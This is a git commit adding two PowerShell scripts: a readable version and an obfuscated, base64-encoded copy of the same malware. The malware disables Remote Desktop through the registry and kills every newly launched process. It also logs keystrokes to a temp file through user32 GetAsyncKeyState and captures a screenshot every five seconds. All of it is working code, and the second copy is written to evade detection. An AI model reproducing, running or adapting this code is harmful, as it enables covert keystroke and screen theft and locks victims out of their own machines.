3ce96ee7eb4fcd76ffbb9bfd2624c10557f36bac
daniel_wolfman <daniel@wolfman.com>
2019-03-11 14:26:10 +0200

    * Added sick PS1 trouble script

---
+++ Act1/lord.ps1
@@ -0,0 +1,279 @@
+function Disable-RemoteConnections { 
+    try {
+        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value 1 
+    }
+    catch { Write-Host "[-] low integrity level of runtime process! (try to run As Administrator...)" -ForegroundColor Red }
+}
+
+$ProcessKillerScript = {
+
+    $proc_state = Get-Process
+    while ($true) {
+        Start-Sleep -Milliseconds 200
+        Compare-Object $proc_state $(Get-Process) -Property Id | where SideIndicator -Like "=>" | select Id | Stop-Process -Force
+    }
+}
+
+$KeyLoggerScript = {
+    $Path = "$env:temp\krabs_ledger.txt"
+$signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+	
+	# load signatures and make members available
+	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+	
+	# create output file
+	$null = New-Item -Path $Path -ItemType File -Force
+		
+function Start-KeyLogger
+{
+    $Path = "$env:temp\krabs_ledger.txt"
+
+		# create endless loop. When user presses CTRL+C, finally-block
+		# executes and shows the collected key presses
+			# scan all ASCII codes above 8
+			for ($ascii = 9; $ascii -le 254; $ascii++)
+			{
+				# get current key state
+				$state = $API::GetAsyncKeyState($ascii)
+				
+				# is key pressed?
+				if ($state -eq -32767)
+				{
+					$null = [console]::CapsLock
+					
+					# translate scan code to real code
+					$virtualKey = $API::MapVirtualKey($ascii, 3)
+					
+					# get keyboard state for virtual keys
+					$kbstate = New-Object Byte[] 256
+					$checkkbstate = $API::GetKeyboardState($kbstate)
+					
+					# prepare a StringBuilder to receive input key
+					$mychar = New-Object -TypeName System.Text.StringBuilder
+					
+					# translate virtual key
+					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+					
+					if ($success)
+					{
+						# add key to logger file
+						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+					}
+				}
+			}
+}
+
+while ($true)
+    {
+	    Start-Sleep -Milliseconds 40
+        Start-KeyLogger
+    }
+}
+
+$ScreenshotScript = {
+function Get-ScreenShot
+{
+    [CmdletBinding(DefaultParameterSetName='OfWholeScreen')]
+    param(    
+    # If set, takes a screen capture of the current window
+    [Parameter(Mandatory=$true,
+        ValueFromPipelineByPropertyName=$true,
+        ParameterSetName='OfWindow')]
+    [Switch]$OfWindow,
+    
+    # If set, takes a screenshot of a location on the screen.
+    # If two numbers are passed, the screenshot will be from 0,0 to first (left), second (top)
+    # If four numbers are passed, the screenshot will be from first (Left), second(top), third (width), fourth (height)
+    [Parameter(Mandatory=$true,
+        ValueFromPipelineByPropertyName=$true,
+        ParameterSetName='OfLocation')]    
+    [Double[]]$OfLocation,
+    
+    # The path for the screenshot. 
+    # If this isn't set, the screenshot will be automatically saved to a file in the current directory named ScreenCapture
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]
+    $Path,
+    
+    # The image format used to store the screen capture
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [ValidateSet('PNG', 'JPEG', 'TIFF', 'GIF', 'BMP')]
+    [string]
+    $ImageFormat = 'JPEG',
+    
+    # The time before and after each screenshot
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [Timespan]$ScreenshotTimer = "0:0:0.125"
+    )
+
+
+    begin {
+        Add-Type -AssemblyName System.Drawing, System.Windows.Forms
+        $saveScreenshotFromClipboard = {
+            if ([Runspace]::DefaultRunspace.ApartmentState -ne 'STA') {
+                # The clipboard isn't accessible in MTA, so save the image in background runspace
+                $cmd = [PowerShell]::Create().AddScript({
+                    $bitmap = [Windows.Forms.Clipboard]::GetImage()    
+                    $bitmap.Save($args[0], $args[1], $args[2])                    
+                    $bitmap.Dispose()
+                }).AddParameters(@("${screenCapturePathBase}${c}.$ImageFormat",$Codec, $ep))
+                $runspace = [RunspaceFactory]::CreateRunspace()
+                $runspace.ApartmentState = 'STA'
+                $runspace.ThreadOptions = 'ReuseThread'
+                $runspace.Open()
+                $cmd.Runspace = $runspace
+                $cmd.Invoke()
+                $runspace.Close()
+                $runspace.Dispose()
+                $cmd.Dispose()
+            } else {            
+                $bitmap = [Windows.Forms.Clipboard]::GetImage()    
+                $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
+                $bitmap.Dispose()
+            }
+        }
+    }
+    process {
+        #region Codec Info
+        $Codec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
+            Where-Object { $_.FormatDescription -eq $ImageFormat }
+
+        $ep = New-Object Drawing.Imaging.EncoderParameters  
+        if ($ImageFormat -eq 'JPEG') {
+            $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
+        }
+        #endregion Codec Info
+        
+
+        #region PreScreenshot timer
+        if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+            Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+        }
+        #endregion Prescreenshot Timer
+        
+        #region File name
+        if (-not $Path) {
+            $screenCapturePathBase = "$pwd\ScreenCapture"
+        } else {
+            $screenCapturePathBase = $Path
+        }
+        $c = 0
+        while (Test-Path "${screenCapturePathBase}${c}.$ImageFormat") {
+            $c++
+        }
+        #endregion
+        
+
+        
+        if ($psCmdlet.ParameterSetName -eq 'OfWindow') {
+            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
+            #region PostScreenshot timer
+            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+            }
+            #endregion Postscreenshot Timer
+            . $saveScreenshotFromClipboard 
+            Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
+        } elseif ($psCmdlet.ParameterSetName -eq 'OfLocation') {
+            if ($OfLocation.Count -ne 2 -and $OfLocation.Count -ne 4) {
+                Write-Error "Must provide either a width and a height, or a top, left, width, and height"                
+                return
+            }
+            if ($OfLocation.Count -eq 2) {
+                $bounds  = New-Object Drawing.Rectangle -Property @{
+                    Width = $OfLocation[0]
+                    Height = $OfLocation[1]
+                }                
+            } else {
+                $bounds  = New-Object Drawing.Rectangle -Property @{
+                    X = $OfLocation[0]
+                    Y = $OfLocation[1]
+                    Width = $OfLocation[2]
+                    Height = $OfLocation[3]
+                }
+            }
+            
+            $bitmap = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+            $graphics = [Drawing.Graphics]::FromImage($bitmap)
+            $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+            #region PostScreenshot timer
+            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+            }
+            #endregion Postscreenshot Timer
+
+            $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
+            $graphics.Dispose()
+            $bitmap.Dispose()
+            Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
+        } elseif ($psCmdlet.ParameterSetName -eq 'OfWholeScreen') {
+            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
+            #region PostScreenshot timer
+            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+            }
+            #endregion Postscreenshot Timer
+            . $saveScreenshotFromClipboard             
+            Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
+        }
+        
+                
+                
+    }
+}
+    while ($true)
+    {
+        Start-Sleep -Seconds 5
+        Get-ScreenShot
+    }
+}
+
+########## THIS IS DEVELOPMENT ###############
+
+#try {
+
+Write-Host "[+] Disabling remote connections to this host..." -ForegroundColor Green
+Disable-RemoteConnections
+
+Write-Host "[+] Starting keylogger..." -ForegroundColor Green
+$Keylogging = Start-Job $KeyLoggerScript
+
+Write-Host "[+] Starting process killer..." -ForegroundColor Green
+$ProcessKiller = Start-Job $ProcessKillerScript
+
+Write-Host "[+] Starting screenshot automation..." -ForegroundColor Green
+$Screenshotter = Start-Job $ScreenshotScript
+
+<#while ($true) { Start-Sleep -Seconds 30 }
+
+}
+
+finally {    
+    Write-Host "[-] Stopped!" -ForegroundColor Red
+    Get-Job | Remove-Job -f
+}
+#>
+
+########## THIS IS PRODUCTION ################
+<#
+Write-Host "[+] Disabling remote connections to this host..." -ForegroundColor Green
+Disable-RemoteConnections
+
+Write-Host "[+] Starting keylogger..." -ForegroundColor Green
+$Keylogging = Start-Job $KeyLoggerScript
+
+Write-Host "[+] Starting process killer..." -ForegroundColor Green
+$ProcessKiller = Start-Job $ProcessKillerScript
+
+Write-Host "[+] Starting screenshot automation..." -ForegroundColor Green
+$Screenshotter = Start-Job $ScreenshotScript
+#>
---
+++ Act1/lord_obf.ps1
@@ -0,0 +1,171 @@
+﻿function _/=\/======\_____/ { 
+    try {
+        sp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwB5AHMAdABlAG0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABDAG8AbgB0AHIAbwBsAFwAVABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIA'))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBEAGUAbgB5AFQAUwBDAG8AbgBuAGUAYwB0AGkAbwBuAHMA'))) –Value 1 
+    }
+    catch { Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABsAG8AdwAgAGkAbgB0AGUAZwByAGkAdAB5ACAAbABlAHYAZQBsACAAbwBmACAAcgB1AG4AdABpAG0AZQAgAHAAcgBvAGMAZQBzAHMAIQAgACgAdAByAHkAIAB0AG8AIAByAHUAbgAgAEEAcwAgAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIALgAuAC4AKQA='))) -ForegroundColor Red }
+}
+${/=\_/\___/\__/==\} = {
+    ${_/\/\_/==\/===\/=} = ps
+    while ($true) {
+        sleep -Milliseconds 200
+        diff ${_/\/\_/==\/===\/=} $(ps) -Property Id | where SideIndicator -Like "=>" | select Id | kill -Force
+    }
+}
+${/=\/\____/\/\__/\} = {
+    ${__/=\/\/\____/===} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AHQAZQBtAHAAXABrAHIAYQBiAHMAXwBsAGUAZABnAGUAcgAuAHQAeAB0AA==')))
+${/====\/\_/=\__/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAEEAdQB0AG8ALAAgAEUAeABhAGMAdABTAHAAZQBsAGwAaQBuAGcAPQB0AHIAdQBlACkAXQAgAA0ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABzAGgAbwByAHQAIABHAGUAdABBAHMAeQBuAGMASwBlAHkAUwB0AGEAdABlACgAaQBuAHQAIAB2AGkAcgB0AHUAYQBsAEsAZQB5AEMAbwBkAGUAKQA7ACAADQAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAAQwBoAGEAcgBTAGUAdAA9AEMAaABhAHIAUwBlAHQALgBBAHUAdABvACkAXQANAAoAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAaQBuAHQAIABHAGUAdABLAGUAeQBiAG8AYQByAGQAUwB0AGEAdABlACgAYgB5AHQAZQBbAF0AIABrAGUAeQBzAHQAYQB0AGUAKQA7AA0ACgBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIALAAgAEMAaABhAHIAUwBlAHQAPQBDAGgAYQByAFMAZQB0AC4AQQB1AHQAbwApAF0ADQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAATQBhAHAAVgBpAHIAdAB1AGEAbABLAGUAeQAoAHUAaQBuAHQAIAB1AEMAbwBkAGUALAAgAGkAbgB0ACAAdQBNAGEAcABUAHkAcABlACkAOwANAAoAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAEEAdQB0AG8AKQBdAA0ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABpAG4AdAAgAFQAbwBVAG4AaQBjAG8AZABlACgAdQBpAG4AdAAgAHcAVgBpAHIAdABLAGUAeQAsACAAdQBpAG4AdAAgAHcAUwBjAGEAbgBDAG8AZABlACwAIABiAHkAdABlAFsAXQAgAGwAcABrAGUAeQBzAHQAYQB0AGUALAAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAFMAdAByAGkAbgBnAEIAdQBpAGwAZABlAHIAIABwAHcAcwB6AEIAdQBmAGYALAAgAGkAbgB0ACAAYwBjAGgAQgB1AGYAZgAsACAAdQBpAG4AdAAgAHcARgBsAGEAZwBzACkAOwA=')))
+	${_/======\/\/\____} = Add-Type -MemberDefinition ${/====\/\_/=\__/=\} -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA=='))) -Namespace API -PassThru
+	$null = ni -Path ${__/=\/\/\____/===} -ItemType File -Force
+function _/=\/===\/\___/\_/
+{
+    ${__/=\/\/\____/===} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AHQAZQBtAHAAXABrAHIAYQBiAHMAXwBsAGUAZABnAGUAcgAuAHQAeAB0AA==')))
+			for (${/===\__/\/\__/\/=} = 9; ${/===\__/\/\__/\/=} -le 254; ${/===\__/\/\__/\/=}++)
+			{
+				${_/=\/===\_/===\/=} = ${_/======\/\/\____}::GetAsyncKeyState(${/===\__/\/\__/\/=})
+				if (${_/=\/===\_/===\/=} -eq -32767)
+				{
+					$null = [console]::CapsLock
+					${_/\_/\_/====\_/\_} = ${_/======\/\/\____}::MapVirtualKey(${/===\__/\/\__/\/=}, 3)
+					${__/\/\/\/\/==\___} = New-Object Byte[] 256
+					${_/=\___/\/====\/\} = ${_/======\/\/\____}::GetKeyboardState(${__/\/\/\/\/==\___})
+					${__/\__/=\__/==\/\} = New-Object -TypeName System.Text.StringBuilder
+					${__/=\_/==\_/===\_} = ${_/======\/\/\____}::ToUnicode(${/===\__/\/\__/\/=}, ${_/\_/\_/====\_/\_}, ${__/\/\/\/\/==\___}, ${__/\__/=\__/==\/\}, ${__/\__/=\__/==\/\}.Capacity, 0)
+					if (${__/=\_/==\_/===\_})
+					{
+						[System.IO.File]::AppendAllText(${__/=\/\/\____/===}, ${__/\__/=\__/==\/\}, [System.Text.Encoding]::Unicode)
+					}
+				}
+			}
+}
+while ($true)
+    {
+	    sleep -Milliseconds 40
+        _/=\/===\/\___/\_/
+    }
+}
+${__/\/\/\_/\/\/=\_} = {
+function ___/==\__/==\_/\_/
+{
+    [CmdletBinding(DefaultParameterSetName='OfWholeScreen')]
+    param(    
+    [Parameter(Mandatory=$true,
+        ValueFromPipelineByPropertyName=$true,
+        ParameterSetName='OfWindow')]
+    [Switch]$OfWindow,
+    [Parameter(Mandatory=$true,
+        ValueFromPipelineByPropertyName=$true,
+        ParameterSetName='OfLocation')]    
+    [Double[]]$OfLocation,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]
+    ${__/=\/\/\____/===},
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [ValidateSet('PNG', 'JPEG', 'TIFF', 'GIF', 'BMP')]
+    [string]
+    $ImageFormat = 'JPEG',
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [Timespan]$ScreenshotTimer = "0:0:0.125"
+    )
+    begin {
+        Add-Type -AssemblyName System.Drawing, System.Windows.Forms
+        ${_/=\__/\____/\__/} = {
+            if ([Runspace]::DefaultRunspace.ApartmentState -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))) {
+                ${_/\/===\__/\_/===} = [PowerShell]::Create().AddScript({
+                    ${___/\__/\/==\/==\} = [Windows.Forms.Clipboard]::GetImage()    
+                    ${___/\__/\/==\/==\}.Save($args[0], $args[1], $args[2])                    
+                    ${___/\__/\/==\/==\}.Dispose()
+                }).AddParameters(@($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0APQA9AD0APQBcAF8AXwBfAF8AXwB9ACQAewAvAD0AXAAvAD0AXABfAC8APQBcAF8AXwAvAD0APQBcAF8AfQAuACQASQBtAGEAZwBlAEYAbwByAG0AYQB0AA=='))),${_/\__/=\___/=====}, ${_/\/=\___/\___/==}))
+                ${___/=\/=\___/\_/=} = [RunspaceFactory]::CreateRunspace()
+                ${___/=\/=\___/\_/=}.ApartmentState = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))
+                ${___/=\/=\___/\_/=}.ThreadOptions = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHUAcwBlAFQAaAByAGUAYQBkAA==')))
+                ${___/=\/=\___/\_/=}.Open()
+                ${_/\/===\__/\_/===}.Runspace = ${___/=\/=\___/\_/=}
+                ${_/\/===\__/\_/===}.Invoke()
+                ${___/=\/=\___/\_/=}.Close()
+                ${___/=\/=\___/\_/=}.Dispose()
+                ${_/\/===\__/\_/===}.Dispose()
+            } else {            
+                ${___/\__/\/==\/==\} = [Windows.Forms.Clipboard]::GetImage()    
+                ${___/\__/\/==\/==\}.Save($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0APQA9AD0APQBcAF8AXwBfAF8AXwB9ACQAewAvAD0AXAAvAD0AXABfAC8APQBcAF8AXwAvAD0APQBcAF8AfQAuACQASQBtAGEAZwBlAEYAbwByAG0AYQB0AA=='))), ${_/\__/=\___/=====}, ${_/\/=\___/\___/==})                    
+                ${___/\__/\/==\/==\}.Dispose()
+            }
+        }
+    }
+    process {
+        ${_/\__/=\___/=====} = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
+            ? { $_.FormatDescription -eq $ImageFormat }
+        ${_/\/=\___/\___/==} = New-Object Drawing.Imaging.EncoderParameters  
+        if ($ImageFormat -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBQAEUARwA=')))) {
+            ${_/\/=\___/\___/==}.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
+        }
+        if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+            sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+        }
+        if (-not ${__/=\/\/\____/===}) {
+            ${_/==\/=====\_____} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABwAHcAZABcAFMAYwByAGUAZQBuAEMAYQBwAHQAdQByAGUA')))
+        } else {
+            ${_/==\/=====\_____} = ${__/=\/\/\____/===}
+        }
+        ${/=\/=\_/=\__/==\_} = 0
+        while (Test-Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0APQA9AD0APQBcAF8AXwBfAF8AXwB9ACQAewAvAD0AXAAvAD0AXABfAC8APQBcAF8AXwAvAD0APQBcAF8AfQAuACQASQBtAGEAZwBlAEYAbwByAG0AYQB0AA==')))) {
+            ${/=\/=\_/=\__/==\_}++
+        }
+        if ($psCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAFcAaQBuAGQAbwB3AA==')))) {
+            [Windows.Forms.Sendkeys]::SendWait($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQB7AFAAcgB0AFMAYwB9AA=='))))        
+            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+            }
+            . ${_/=\__/\____/\__/} 
+            gi -ErrorAction SilentlyContinue -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0APQA9AD0APQBcAF8AXwBfAF8AXwB9ACQAewAvAD0AXAAvAD0AXABfAC8APQBcAF8AXwAvAD0APQBcAF8AfQAuACQASQBtAGEAZwBlAEYAbwByAG0AYQB0AA==')))
+        } elseif ($psCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAEwAbwBjAGEAdABpAG8AbgA=')))) {
+            if ($OfLocation.Count -ne 2 -and $OfLocation.Count -ne 4) {
+                Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AHMAdAAgAHAAcgBvAHYAaQBkAGUAIABlAGkAdABoAGUAcgAgAGEAIAB3AGkAZAB0AGgAIABhAG4AZAAgAGEAIABoAGUAaQBnAGgAdAAsACAAbwByACAAYQAgAHQAbwBwACwAIABsAGUAZgB0ACwAIAB3AGkAZAB0AGgALAAgAGEAbgBkACAAaABlAGkAZwBoAHQA')))                
+                return
+            }
+            if ($OfLocation.Count -eq 2) {
+                ${/===\/\/\/=\/\___}  = New-Object Drawing.Rectangle -Property @{
+                    Width = $OfLocation[0]
+                    Height = $OfLocation[1]
+                }                
+            } else {
+                ${/===\/\/\/=\/\___}  = New-Object Drawing.Rectangle -Property @{
+                    X = $OfLocation[0]
+                    Y = $OfLocation[1]
+                    Width = $OfLocation[2]
+                    Height = $OfLocation[3]
+                }
+            }
+            ${___/\__/\/==\/==\} = New-Object Drawing.Bitmap ${/===\/\/\/=\/\___}.width, ${/===\/\/\/=\/\___}.height
+            ${_/=\/\/\/=\_/\_/\} = [Drawing.Graphics]::FromImage(${___/\__/\/==\/==\})
+            ${_/=\/\/\/=\_/\_/\}.CopyFromScreen(${/===\/\/\/=\/\___}.Location, [Drawing.Point]::Empty, ${/===\/\/\/=\/\___}.size)
+            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+            }
+            ${___/\__/\/==\/==\}.Save($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0APQA9AD0APQBcAF8AXwBfAF8AXwB9ACQAewAvAD0AXAAvAD0AXABfAC8APQBcAF8AXwAvAD0APQBcAF8AfQAuACQASQBtAGEAZwBlAEYAbwByAG0AYQB0AA=='))), ${_/\__/=\___/=====}, ${_/\/=\___/\___/==})                    
+            ${_/=\/\/\/=\_/\_/\}.Dispose()
+            ${___/\__/\/==\/==\}.Dispose()
+            gi -ErrorAction SilentlyContinue -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0APQA9AD0APQBcAF8AXwBfAF8AXwB9ACQAewAvAD0AXAAvAD0AXABfAC8APQBcAF8AXwAvAD0APQBcAF8AfQAuACQASQBtAGEAZwBlAEYAbwByAG0AYQB0AA==')))
+        } elseif ($psCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAFcAaABvAGwAZQBTAGMAcgBlAGUAbgA=')))) {
+            [Windows.Forms.Sendkeys]::SendWait($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewBQAHIAdABTAGMAfQA='))))        
+            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+            }
+            . ${_/=\__/\____/\__/}             
+            gi -ErrorAction SilentlyContinue -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0APQA9AD0APQBcAF8AXwBfAF8AXwB9ACQAewAvAD0AXAAvAD0AXABfAC8APQBcAF8AXwAvAD0APQBcAF8AfQAuACQASQBtAGEAZwBlAEYAbwByAG0AYQB0AA==')))
+        }
+    }
+}
+    while ($true)
+    {
+        sleep -Seconds 5
+        ___/==\__/==\_/\_/
+    }
+}
+Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAGkAcwBhAGIAbABpAG4AZwAgAHIAZQBtAG8AdABlACAAYwBvAG4AbgBlAGMAdABpAG8AbgBzACAAdABvACAAdABoAGkAcwAgAGgAbwBzAHQALgAuAC4A'))) -ForegroundColor Green
+_/=\/======\_____/
+Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHQAYQByAHQAaQBuAGcAIABrAGUAeQBsAG8AZwBnAGUAcgAuAC4ALgA='))) -ForegroundColor Green
+${_/==\/=\_/\/=\___} = sajb ${/=\/\____/\/\__/\}
+Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHQAYQByAHQAaQBuAGcAIABwAHIAbwBjAGUAcwBzACAAawBpAGwAbABlAHIALgAuAC4A'))) -ForegroundColor Green
+${_/=\/\_/\__/=\__/} = sajb ${/=\_/\___/\__/==\}
+Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHQAYQByAHQAaQBuAGcAIABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAYQB1AHQAbwBtAGEAdABpAG8AbgAuAC4ALgA='))) -ForegroundColor Green
+${_/\_/======\_/\__} = sajb ${__/\/\/\_/\/\/=\_}
